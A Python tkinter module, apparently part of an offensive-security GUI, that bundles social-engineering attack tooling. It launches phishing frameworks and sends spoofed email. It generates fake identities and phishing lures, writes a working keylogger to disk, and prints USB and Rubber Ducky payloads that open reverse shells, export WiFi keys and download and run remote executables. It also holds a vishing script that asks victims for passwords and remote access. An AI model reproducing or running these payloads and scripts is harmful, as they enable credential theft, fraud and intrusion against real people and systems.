import tkinter as tk
from tkinter import ttk, messagebox
import subprocess, threading, os, shutil, random, string
from datetime import datetime
from gui.base_module import BaseModule

class SocialEngineering(BaseModule):
    def __init__(self, parent, db, logger):
        super().__init__(parent)
        self.db = db; self.logger = logger

    def build_content(self):
        self.add_title("Social Engineering", "Phishing, pretexting, credential harvesting, OSINT")
        
        self.output = tk.Text(self.inner, font=("Courier",9), bg="#0a0a0a", fg="#00ff88", relief="flat", height=15)
        self.output.pack(fill="both", expand=True, padx=10, pady=5)
        
        bf = tk.Frame(self.inner, bg="#1a1a2e"); bf.pack(fill="x", padx=10, pady=5)
        
        tools = self._detect_tools()
        for name, func, color in tools:
            tk.Button(bf, text=name, font=("Courier",8), fg="#000", bg=color, relief="flat", padx=6,
                    command=func).pack(side="left", padx=2)
        
        tk.Button(bf, text="STOP", font=("Courier",8,"bold"), fg="#fff", bg="#cc0000",
                relief="flat", padx=6, command=self._stop).pack(side="right", padx=2)
        
        self.status = self.add_status(f"Ready - {len(tools)} SE tools detected | FOR AUTHORIZED USE ONLY")

    def _detect_tools(self):
        tools = []
        
        # === PHISHING FRAMEWORKS ===
        if shutil.which("setoolkit"):
            tools.append(("SEToolkit", self._run_set, "#ff0000"))
        if shutil.which("zphisher"):
            tools.append(("ZPhisher", lambda: self._cmd("zphisher"), "#ff4444"))
        if shutil.which("blackeye"):
            tools.append(("BlackEye", lambda: self._cmd("blackeye"), "#ff4444"))
        if shutil.which("socialfish"):
            tools.append(("SocialFish", lambda: self._cmd("socialfish"), "#ff4444"))
        if shutil.which("gophish"):
            tools.append(("GoPhish", lambda: self._cmd("gophish"), "#ffaa00"))
        if shutil.which("evilginx2"):
            tools.append(("EvilGinx2", lambda: self._cmd("evilginx2 -p phishlet"), "#ff0000"))
        if shutil.which("modlishka"):
            tools.append(("Modlishka", lambda: self._cmd("modlishka -config config.json"), "#ff0000"))
        
        # === EMAIL TOOLS ===
        if shutil.which("swaks"):
            tools.append(("SWAKS Email", self._run_swaks, "#00ccff"))
        if shutil.which("sendemail"):
            tools.append(("SendEmail", self._run_sendemail, "#00ccff"))
        if shutil.which("mail"):
            tools.append(("Mail Send", self._run_mail, "#00ccff"))
        
        # === SMS SPOOFING ===
        if shutil.which("curl"):
            tools.append(("SMS Gateway", self._sms_gateway, "#ffaa00"))
        
        # === PRETEXT GENERATORS ===
        tools.append(("Fake Identity", self._fake_identity, "#bc8cff"))
        tools.append(("Fake Company", self._fake_company, "#bc8cff"))
        tools.append(("Fake Email", self._fake_email, "#bc8cff"))
        tools.append(("Fake Document", self._fake_document, "#bc8cff"))
        
        # === CREDENTIAL HARVESTING ===
        if shutil.which("credphisher"):
            tools.append(("CredPhisher", lambda: self._cmd("credphisher"), "#ff4444"))
        tools.append(("Clone Login", self._clone_login, "#ff0000"))
        tools.append(("Keylogger Gen", self._keylogger_gen, "#ff0000"))
        
        # === QR CODE ===
        tools.append(("QR Code Phish", self._qr_phish, "#d2991d"))
        tools.append(("QR Code Generator", self._qr_generate, "#d2991d"))
        
        # === USB DROP ===
        tools.append(("USB Payload", self._usb_payload, "#ff8800"))
        tools.append(("USB Rubber Ducky", self._rubber_ducky, "#ff8800"))
        
        # === VOICE PHISHING ===
        tools.append(("Vishing Script", self._vishing_script, "#39c5cf"))
        
        # === REPORTING ===
        tools.append(("Campaign Report", self._campaign_report, "#00ff88"))
        
        # === OSINT PREP ===
        tools.append(("Target Profile", self._target_profile, "#58a6ff"))
        tools.append(("Email Finder", self._email_finder, "#58a6ff"))
        tools.append(("Employee Search", self._employee_search, "#58a6ff"))
        
        return tools

    def _cmd(self, cmd):
        self.output.insert("end", f"\n{'='*60}\n$ {cmd[:80]}\n{'='*60}\n\n")
        self.output.see("end")
        def do():
            try:
                p = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
                for line in p.stdout:
                    self.output.insert("end", line); self.output.see("end")
                p.wait()
            except Exception as e:
                self.output.insert("end", f"\n[X] {e}\n")
        threading.Thread(target=do, daemon=True).start()

    def _run_set(self):
        self._cmd("setoolkit")

    def _run_swaks(self):
        d = tk.Toplevel(self.frame, bg="#1a1a2e"); d.title("SWAKS Email"); d.geometry("500x400")
        tk.Label(d, text="Send Email via SWAKS", font=("Courier",14,"bold"), fg="#00ff88", bg="#1a1a2e").pack(pady=10)
        fields = [("From:","from"),("To:","to"),("Subject:","subject"),("Body:","body"),("SMTP Server:","server")]
        entries = {}
        for label, key in fields:
            tk.Label(d, text=label, font=("Courier",9), fg="#aaa", bg="#1a1a2e").pack(anchor="w", padx=20)
            e = tk.Entry(d, font=("Courier",10), bg="#16213e", fg="#fff", relief="flat")
            e.pack(fill="x", padx=20, pady=2)
            entries[key] = e
        def send():
            cmd = f"swaks --from {entries['from'].get()} --to {entries['to'].get()} --server {entries['server'].get()} --header 'Subject: {entries['subject'].get()}' --body '{entries['body'].get()}'"
            d.destroy()
            self._cmd(cmd)
        tk.Button(d, text="Send", font=("Courier",10,"bold"), fg="#000", bg="#ff4444", relief="raised", padx=20, pady=8, command=send).pack(pady=10)

    def _run_sendemail(self):
        d = tk.Toplevel(self.frame, bg="#1a1a2e"); d.title("SendEmail"); d.geometry("500x400")
        tk.Label(d, text="Send Email", font=("Courier",14,"bold"), fg="#00ff88", bg="#1a1a2e").pack(pady=10)
        fields = [("From:","from"),("To:","to"),("Subject:","subject"),("Message:","msg"),("SMTP:","smtp")]
        entries = {}
        for label, key in fields:
            tk.Label(d, text=label, font=("Courier",9), fg="#aaa", bg="#1a1a2e").pack(anchor="w", padx=20)
            e = tk.Entry(d, font=("Courier",10), bg="#16213e", fg="#fff", relief="flat")
            e.pack(fill="x", padx=20, pady=2)
            entries[key] = e
        def send():
            cmd = f"sendemail -f {entries['from'].get()} -t {entries['to'].get()} -u '{entries['subject'].get()}' -m '{entries['msg'].get()}' -s {entries['smtp'].get()}"
            d.destroy()
            self._cmd(cmd)
        tk.Button(d, text="Send", font=("Courier",10,"bold"), fg="#000", bg="#ff4444", relief="raised", padx=20, pady=8, command=send).pack(pady=10)

    def _run_mail(self):
        d = tk.Toplevel(self.frame, bg="#1a1a2e"); d.title("Mail Command"); d.geometry("500x400")
        tk.Label(d, text="Send via mail command", font=("Courier",14,"bold"), fg="#00ff88", bg="#1a1a2e").pack(pady=10)
        fields = [("To:","to"),("Subject:","subject"),("Body:","body")]
        entries = {}
        for label, key in fields:
            tk.Label(d, text=label, font=("Courier",9), fg="#aaa", bg="#1a1a2e").pack(anchor="w", padx=20)
            e = tk.Entry(d, font=("Courier",10), bg="#16213e", fg="#fff", relief="flat")
            e.pack(fill="x", padx=20, pady=2)
            entries[key] = e
        def send():
            cmd = f"echo '{entries['body'].get()}' | mail -s '{entries['subject'].get()}' {entries['to'].get()}"
            d.destroy()
            self._cmd(cmd)
        tk.Button(d, text="Send", font=("Courier",10,"bold"), fg="#000", bg="#ff4444", relief="raised", padx=20, pady=8, command=send).pack(pady=10)

    def _sms_gateway(self):
        carriers = {
            "Verizon":"@vtext.com","AT&T":"@txt.att.net","T-Mobile":"@tmomail.net",
            "Sprint":"@messaging.sprintpcs.com","MetroPCS":"@mymetropcs.com",
            "Boost":"@sms.myboostmobile.com","Cricket":"@sms.cricketwireless.net",
        }
        self.output.insert("end", "\n[*] SMS Gateways (send email to number@gateway):\n")
        for name, gateway in carriers.items():
            self.output.insert("end", f"  {name}: NUMBER{gateway}\n")
        self.output.insert("end", "\n  Use SWAKS or SendEmail above to send SMS\n")
        self.output.see("end")

    def _fake_identity(self):
        first = ["James","John","Robert","Michael","William","David","Richard","Joseph","Thomas","Charles","Mary","Patricia","Jennifer","Linda","Barbara","Elizabeth","Susan","Jessica","Sarah","Karen"]
        last = ["Smith","Johnson","Williams","Brown","Jones","Garcia","Miller","Davis","Rodriguez","Martinez","Hernandez","Lopez","Gonzalez","Wilson","Anderson","Thomas","Taylor","Moore","Jackson","Martin"]
        domains = ["gmail.com","outlook.com","yahoo.com","protonmail.com","tutanota.com"]
        fname = random.choice(first)
        lname = random.choice(last)
        email = f"{fname.lower()}.{lname.lower()}{random.randint(1,99)}@{random.choice(domains)}"
        phone = f"{random.randint(200,999)}-{random.randint(100,999)}-{random.randint(1000,9999)}"
        
        self.output.insert("end", f"\n[*] Generated Identity:\n")
        self.output.insert("end", f"  Name: {fname} {lname}\n")
        self.output.insert("end", f"  Email: {email}\n")
        self.output.insert("end", f"  Phone: {phone}\n")
        self.output.insert("end", f"  Company: {random.choice(['Tech','Global','United','American','Pacific','National','International'])} {random.choice(['Solutions','Systems','Industries','Group','Corp','LLC'])}\n")
        self.output.see("end")

    def _fake_company(self):
        prefixes = ["Tech","Global","United","American","Pacific","National","International","Advanced","Premier","Elite"]
        suffixes = ["Solutions","Systems","Industries","Group","Corp","LLC","Inc","Partners","Associates","Technologies"]
        company = f"{random.choice(prefixes)} {random.choice(suffixes)}"
        domain = company.lower().replace(" ","") + ".com"
        
        self.output.insert("end", f"\n[*] Generated Company:\n")
        self.output.insert("end", f"  Name: {company}\n")
        self.output.insert("end", f"  Domain: {domain}\n")
        self.output.insert("end", f"  Email: contact@{domain}\n")
        self.output.insert("end", f"  Phone: {random.randint(200,999)}-{random.randint(100,999)}-{random.randint(1000,9999)}\n")
        self.output.insert("end", f"  Address: {random.randint(100,9999)} {random.choice(['Main','Oak','Pine','Maple','Cedar','Park','Washington','Lincoln'])} St, Suite {random.randint(100,999)}\n")
        self.output.see("end")

    def _fake_email(self):
        d = tk.Toplevel(self.frame, bg="#1a1a2e"); d.title("Fake Email Generator"); d.geometry("500x400")
        tk.Label(d, text="Generate Fake Email", font=("Courier",14,"bold"), fg="#00ff88", bg="#1a1a2e").pack(pady=10)
        fields = [("To:","to"),("From Name:","from_name"),("Subject:","subject"),("Urgency:","urgency")]
        entries = {}
        for label, key in fields:
            tk.Label(d, text=label, font=("Courier",9), fg="#aaa", bg="#1a1a2e").pack(anchor="w", padx=20)
            e = tk.Entry(d, font=("Courier",10), bg="#16213e", fg="#fff", relief="flat")
            e.pack(fill="x", padx=20, pady=2)
            entries[key] = e
        templates = {
            "Password Reset":"Your password is about to expire. Click here to reset: http://fake-login.com/reset",
            "Urgent Update":"Critical security update required. Download patch immediately: http://evil.com/patch.exe",
            "Invoice Due":"Invoice #INV-2024-{random.randint(1000,9999)} is past due. View invoice: http://fake.com/invoice",
            "Meeting Invite":"Meeting scheduled for tomorrow. Join: http://evil.com/meeting",
        }
        def generate():
            urgency = entries['urgency'].get() or "Password Reset"
            body = templates.get(urgency, templates["Password Reset"])
            self.output.insert("end", f"\n[*] Generated Email:\n")
            self.output.insert("end", f"  From: {entries['from_name'].get()}\n")
            self.output.insert("end", f"  To: {entries['to'].get()}\n")
            self.output.insert("end", f"  Subject: {entries['subject'].get()}\n")
            self.output.insert("end", f"  Body: {body}\n")
            self.output.see("end")
            d.destroy()
        tk.Button(d, text="Generate", font=("Courier",10,"bold"), fg="#000", bg="#ff4444", relief="raised", padx=20, pady=8, command=generate).pack(pady=10)

    def _fake_document(self):
        templates = {
            "Invoice":"INVOICE #2024-{random.randint(1000,9999)}\nDate: {datetime.now().strftime('%Y-%m-%d')}\nDue: Net 30\nAmount: ${random.randint(500,5000)}.00",
            "Offer Letter":"EMPLOYMENT OFFER\nPosition: Senior Developer\nSalary: ${random.randint(80000,150000)}\nStart Date: {datetime.now().strftime('%Y-%m-%d')}",
            "NDA":"NON-DISCLOSURE AGREEMENT\nParties: Company and Recipient\nEffective: {datetime.now().strftime('%Y-%m-%d')}",
        }
        self.output.insert("end", "\n[*] Document Templates:\n")
        for name, template in templates.items():
            self.output.insert("end", f"\n  [{name}]\n  {template}\n")
        self.output.see("end")

    def _clone_login(self):
        self.output.insert("end", f"\n[*] Clone Login Page:\n")
        self.output.insert("end", "  1. wget https://target.com/login -O login.html\n")
        self.output.insert("end", "  2. Edit form action to your server\n")
        self.output.insert("end", "  3. Host with: python3 -m http.server 8080\n")
        self.output.insert("end", "  4. Use ngrok: ngrok http 8080\n")
        self.output.see("end")

    def _keylogger_gen(self):
        code = '''import pynput.keyboard
import logging
logging.basicConfig(filename="keys.log", level=logging.DEBUG, format="%(asctime)s: %(message)s")
def on_press(key):
    try: logging.info(str(key.char))
    except: logging.info(str(key))
with pynput.keyboard.Listener(on_press=on_press) as listener:
    listener.join()'''
        path = os.path.expanduser("~/keylogger.py")
        with open(path, "w") as f: f.write(code)
        self.output.insert("end", f"\n[*] Keylogger saved to: {path}\n")
        self.output.insert("end", "  Run: pip install pynput && python3 keylogger.py\n")
        self.output.see("end")

    def _qr_phish(self):
        self.output.insert("end", f"\n[*] QR Code Phishing:\n")
        self.output.insert("end", "  1. Generate QR: qrencode -o qr.png 'https://your-phish-page.com'\n")
        self.output.insert("end", "  2. Print and place near target\n")
        self.output.insert("end", "  3. Track scans via server logs\n")
        self.output.see("end")

    def _qr_generate(self):
        if shutil.which("qrencode"):
            d = tk.Toplevel(self.frame, bg="#1a1a2e"); d.title("QR Generator"); d.geometry("400x200")
            tk.Label(d, text="URL/Text for QR:", font=("Courier",10), fg="#fff", bg="#1a1a2e").pack(padx=20, pady=10)
            url_e = tk.Entry(d, font=("Courier",10), bg="#16213e", fg="#fff", relief="flat")
            url_e.pack(fill="x", padx=20, pady=5)
            url_e.insert(0, "https://example.com")
            def gen():
                url = url_e.get().strip()
                path = os.path.expanduser("~/qr_code.png")
                subprocess.run(["qrencode","-o",path,url])
                messagebox.showinfo("Done", f"QR saved to {path}")
                d.destroy()
            tk.Button(d, text="Generate", font=("Courier",10,"bold"), fg="#000", bg="#d2991d", relief="raised", padx=20, pady=8, command=gen).pack(pady=10)
        else:
            self.output.insert("end", "\n[!] Install: pkg install qrencode\n")

    def _usb_payload(self):
        payloads = {
            "Reverse Shell":"powershell -c \"$c=New-Object System.Net.Sockets.TCPClient('IP',4444);...\"",
            "Data Exfil":"xcopy C:\\Users\\%USERNAME%\\Documents\\*.docx E:\\ /s /y",
            "Wifi Dump":"netsh wlan export profile key=clear",
        }
        self.output.insert("end", "\n[*] USB Payloads (save as .bat on USB):\n")
        for name, payload in payloads.items():
            self.output.insert("end", f"\n  [{name}]\n  {payload}\n")
        self.output.see("end")

    def _rubber_ducky(self):
        scripts = {
            "Win+R Shell":"GUI r\nDELAY 500\nSTRING powershell\nENTER\nDELAY 1000\nSTRING IEX(New-Object Net.WebClient).DownloadString('http://IP/payload.ps1')\nENTER",
            "Reverse Shell":"STRING cmd /c curl http://IP/shell.exe -o %TEMP%\\s.exe && %TEMP%\\s.exe\nENTER",
        }
        self.output.insert("end", "\n[*] Rubber Ducky Scripts:\n")
        for name, script in scripts.items():
            self.output.insert("end", f"\n  [{name}]\n  {script}\n")
        self.output.see("end")

    def _vishing_script(self):
        script = """VISHING CALL SCRIPT
===============
"Hello, this is [NAME] from [COMPANY] IT department.
We've detected unusual activity on your account.
I need to verify your identity. Can you confirm your employee ID and password?
This is urgent - your account will be locked in 30 minutes if not verified."

ALTERNATIVE:
"Hi, I'm calling from Microsoft support. Your computer has been
sending error reports. I need to remote in to fix it.
Please go to www.teamviewer.com and tell me your ID." """
        self.output.insert("end", f"\n[*] Vishing Script:\n{script}\n")
        self.output.see("end")

    def _campaign_report(self):
        self.output.insert("end", "\n[*] Campaign Report Template:\n")
        self.output.insert("end", "  Emails Sent: ___\n")
        self.output.insert("end", "  Opened: ___\n")
        self.output.insert("end", "  Clicked Link: ___\n")
        self.output.insert("end", "  Credentials Captured: ___\n")
        self.output.insert("end", "  Success Rate: __%\n")
        self.output.see("end")

    def _target_profile(self):
        self.output.insert("end", "\n[*] Target Profile Template:\n")
        self.output.insert("end", "  Name:\n  Position:\n  Email:\n  Phone:\n")
        self.output.insert("end", "  Social Media:\n  Interests:\n  Schedule:\n")
        self.output.insert("end", "  Tech Stack:\n  Security Awareness: Low/Med/High\n")
        self.output.see("end")

    def _email_finder(self):
        self.output.insert("end", "\n[*] Email Discovery Methods:\n")
        self.output.insert("end", "  1. hunter.io - Domain email search\n")
        self.output.insert("end", "  2. phonebook.cz - Free email finder\n")
        self.output.insert("end", "  3. theHarvester -d company.com -b google\n")
        self.output.insert("end", "  4. LinkedIn Sales Navigator\n")
        self.output.insert("end", "  5. clearbit.com/company.com\n")
        self.output.see("end")

    def _employee_search(self):
        self.output.insert("end", "\n[*] Employee Discovery:\n")
        self.output.insert("end", "  1. LinkedIn: site:linkedin.com/in 'Company Name'\n")
        self.output.insert("end", "  2. Twitter: Advanced search by company\n")
        self.output.insert("end", "  3. GitHub: org:companyname\n")
        self.output.insert("end", "  4. Instagram: #companyname\n")
        self.output.insert("end", "  5. Company website: /about /team /careers\n")
        self.output.see("end")

    def _stop(self):
        self.output.insert("end", "\n[STOPPED]\n")
        self.status.config(text="Stopped")
